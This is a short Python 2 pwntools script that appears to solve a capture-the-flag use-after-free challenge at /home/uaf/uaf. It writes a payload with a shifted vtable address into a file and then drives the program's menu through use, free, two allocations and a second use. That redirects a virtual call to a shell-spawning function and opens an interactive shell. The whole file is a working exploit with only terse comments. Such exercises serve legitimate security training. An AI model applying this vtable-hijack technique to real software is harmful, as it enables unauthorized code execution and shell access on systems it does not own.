#!/usr/bin/env python2

from pwn import *
import os


SCRIPT_PATH = os.path.dirname(__file__)


def main():
    payload = p64(0x0000000000401588) + "a" * 0x10   # obj.vtableforHuman + 0x8 to align for Human::get_shel()

    payload_len = len(payload)
    payload_path = os.path.abspath(os.path.join(SCRIPT_PATH, "payload.txt"))
    open(payload_path, "w").write(payload)

    s = process(["/home/uaf/uaf", "%i" % payload_len, payload_path])

    # User interaction
    s.sendline("1")  # Use
    s.sendline("3")  # Free objects
    s.sendline("2")  # Make chunk from file
    s.sendline("2")  # Make another chunnk to occupy the second object
    s.sendline("1")  # Use after free
    s.interactive()


if __name__ == '__main__':
    main()
